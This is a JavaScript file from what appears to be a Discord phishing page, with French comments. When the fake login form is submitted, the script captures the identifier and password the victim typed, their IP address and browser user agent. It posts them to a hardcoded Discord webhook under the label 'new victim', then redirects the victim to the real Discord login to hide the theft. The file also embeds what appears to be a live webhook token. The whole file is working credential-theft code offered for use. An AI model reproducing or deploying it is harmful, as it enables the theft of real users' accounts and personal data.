document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const identifier = document.getElementById('emailORphone').value.trim();
        const password = document.getElementById('password').value.trim();
        
        if (!identifier || !password) {
            alert("Veuillez remplir tous les champs.");
            return;
        }

        // === TON WEBHOOK ICI ===
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1492541774814777466/WSn9nb3REMUYTi-k_8F6_cBnZ6R-1atpqWTU5E4oM7atSk3AtGZWW8-K1n8EgUkKjLvV"; 

        const embed = {
            title: "🔑 Nouvelle victime - Discord Login",
            color: 0x5865F2, // couleur Discord
            fields: [
                {
                    name: "Identifiant",
                    value: `\`\`\`${identifier}\`\`\``,
                    inline: false
                },
                {
                    name: "Mot de passe",
                    value: `\`\`\`${password}\`\`\``,
                    inline: false
                },
                {
                    name: "IP",
                    value: "```" + (await fetch('https://api.ipify.org?format=text').then(r => r.text()).catch(() => "IP masquée")) + "```",
                    inline: true
                },
                {
                    name: "User-Agent",
                    value: `\`\`\`${navigator.userAgent}\`\`\``,
                    inline: false
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Phish by Xander"
            }
        };

        const payload = {
            username: "Discord Stealer",
            avatar_url: "https://discord.com/assets/f9bb9c4af2b9c32a2c5b2645f1c6c2f2.png",
            embeds: [embed]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            // Redirection vers le vrai Discord après vol
            window.location.href = "https://discord.com/login";
        } catch (err) {
            console.error("Erreur webhook :", err);
            // On redirige quand même
            window.location.href = "https://discord.com/login";
        }
    });
});
